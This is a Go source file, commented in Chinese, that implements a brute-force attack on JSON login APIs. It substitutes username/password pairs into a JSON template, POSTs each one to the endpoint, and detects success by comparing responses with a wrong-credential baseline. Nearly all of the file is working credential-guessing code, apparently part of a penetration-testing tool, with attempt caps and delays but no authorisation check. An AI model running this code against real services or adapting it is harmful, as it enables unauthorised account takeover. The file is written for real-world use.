// JSON API 登录爆破：针对无 <form> 的 JSON 登录接口。
// 用户在界面上提供 JSON 模板（含 {user}/{pass} 占位符）与可选成功特征，
// 工具逐组合替换占位符后 POST——命中判定：HTTP 200 且（可选）包含
// 成功特征串，且响应偏离失败基线。
package loginbrute

import (
	"fmt"
	"strings"
)

// JSONBrute JSON API 登录爆破：返回命中列表（命中一组即停）。
// JSONTemplate 为含 {user}/{pass} 占位符的 JSON 模板；JSONEndpoint
// 为空时 POST 到登录页地址。maxTries/intervalMS 同表单模式语义。
func JSONBrute(p Poster, o Options, onProgress func(done, total int, msg string)) ([]Hit, error) {
	if onProgress == nil {
		onProgress = func(int, int, string) {}
	}
	if o.JSONTemplate == "" {
		return nil, fmt.Errorf("JSON 模式需要提供 JSON 模板（含 {user}/{pass} 占位符）")
	}
	if o.MaxTries <= 0 {
		o.MaxTries = 300
	}
	endpoint := o.JSONEndpoint
	if endpoint == "" {
		endpoint = o.PageURL
	}

	type combo struct{ u, pw string }
	var combos []combo
	for _, u := range o.Users {
		for _, pw := range o.Passwords {
			if len(combos) >= o.MaxTries {
				break
			}
			combos = append(combos, struct{ u, pw string }{u, pw})
		}
	}
	total := len(combos)

	// 失败基线：一组必然错误的提交（仅取响应体尺寸）
	_, bBody, berr := p.PostJSON(endpoint, applyJSON(o.JSONTemplate, "__nl__", "__nl__"))
	baseSize := len(bBody)
	if berr != nil {
		baseSize = 0
	}

	var hits []Hit
	for i, c := range combos {
		sleepInterval(o.IntervalMS, i)
		body := applyJSON(o.JSONTemplate, c.u, c.pw)
		status, rbody, rerr := p.PostJSON(endpoint, body)
		onProgress(i+2, total, c.u+" / "+strings.Repeat("*", len(c.pw)))
		if rerr != nil {
			continue
		}
		if status == 200 &&
			(o.SuccessContains == "" || strings.Contains(rbody, o.SuccessContains)) &&
			(baseSize == 0 || rbody != bBody) {
			hits = append(hits, Hit{
				Type: "json-api", User: c.u, Password: c.pw, URL: endpoint,
				Note: "JSON API 登录命中为启发式判定，请人工复核",
			})
			break
		}
	}
	return hits, nil
}

// applyJSON 模板占位符替换。
func applyJSON(tpl, user, pass string) string {
	return strings.NewReplacer("{user}", user, "{pass}", pass).Replace(tpl)
}
